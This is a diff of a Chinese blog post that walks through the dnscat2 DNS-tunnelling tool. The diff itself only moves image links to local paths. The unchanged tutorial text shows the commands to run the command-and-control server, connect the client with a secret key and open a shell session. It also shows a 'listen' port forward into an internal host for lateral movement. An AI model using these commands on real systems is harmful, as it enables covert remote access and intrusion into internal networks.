@@ -83,7 +83,7 @@ ruby ./dnscat2.rb
 #docker用户  docker run -p 53:53/udp -it --rm mpercival/dnscat2 ruby ./dnscat2.rb
 </code></pre></div></div>
 
-<p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2841831801.png" alt="2841831801" /></p>
+<p><img src="/old_img/2017-04-17-2841831801.png" alt="2841831801" /></p>
 
 <p>可以通过两种方式设置C&amp;C地址，如果没有域名的话，直接在外网VPS运行ruby ./dnscat2.rb 有域名的童鞋，先设置好NS服务器将NS记录修改为当前的机器。然后通过ruby ./dnscat2.rb yourdomain 我这里使用的IP地址</p>
 
@@ -94,10 +94,10 @@ ruby ./dnscat2.rb
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dnscat2.exe --dns=server=server端ip --secret=c2c6d04cab68ee2947d80316858da0f8
 </code></pre></div></div>
 
-<p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3501735141.png" alt="3501735141" /></p>
+<p><img src="/old_img/2017-04-17-3501735141.png" alt="3501735141" /></p>
 
 <p>由于在新版本的dnscat2是加密的所以我们在客户端执行的时候要加上秘钥，不然无法正确的建立连接
-<img src="http://ogmho3r7t.bkt.clouddn.com/2017-04-17-197873402.png" alt="197873402" /></p>
+<img src="/old_img/2017-04-17-197873402.png" alt="197873402" /></p>
 
 <p>获取shell</p>
 
@@ -106,15 +106,15 @@ help #通过help可以看到支持的命令
 shell  #执行之后会新生成一个session  需要通过session -i 2 切过去
 </code></pre></div></div>
 
-<p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-04-17-842306562.png" alt="842306562" /></p>
+<p><img src="/old_img/2017-04-17-842306562.png" alt="842306562" /></p>
 
 <p>这样就成功获取了一个shell，我们可以通过数据包看一下</p>
 
-<p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3078174618.png" alt="3078174618" /></p>
+<p><img src="/old_img/2017-04-17-3078174618.png" alt="3078174618" /></p>
 
 <p>数据都是通过DNS发出去的，并且是加密过的，因为在最初的dnscat2的版本中，数据只是简单的hex编码。到最新版的默认就已经加密</p>
 
-<p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2981816537.png" alt="2981816537" /></p>
+<p><img src="/old_img/2017-04-17-2981816537.png" alt="2981816537" /></p>
 
 <p>通过Salsa20加密算法进行了加密，如果不知道秘钥，就几乎不能解密数据包了。除了普通的反弹shell和上传下载文件功能，还有一个比较有用的功能
 可以通过dnscat2实现DNS隧道，然后进行内网渗透。在成功获取一个session之后执行</p>
@@ -123,11 +123,11 @@ shell  #执行之后会新生成一个session  需要通过session -i 2 切过�
 listen 4444 10.211.55.19:22 #将内网10.211.55.19的22端口转发到本地的4444
 </code></pre></div></div>
 
-<p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2557060718.png" alt="2557060718" /></p>
+<p><img src="/old_img/2017-04-17-2557060718.png" alt="2557060718" /></p>
 
 <p>然后直接ssh本地的ip的4444端口</p>
 
-<p><img src="http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2093290607.png" alt="2093290607" /></p>
+<p><img src="/old_img/2017-04-17-2093290607.png" alt="2093290607" /></p>
 
 <p>注意的是我用的docker环境，所以是直接ssh的docker的ip</p>
 
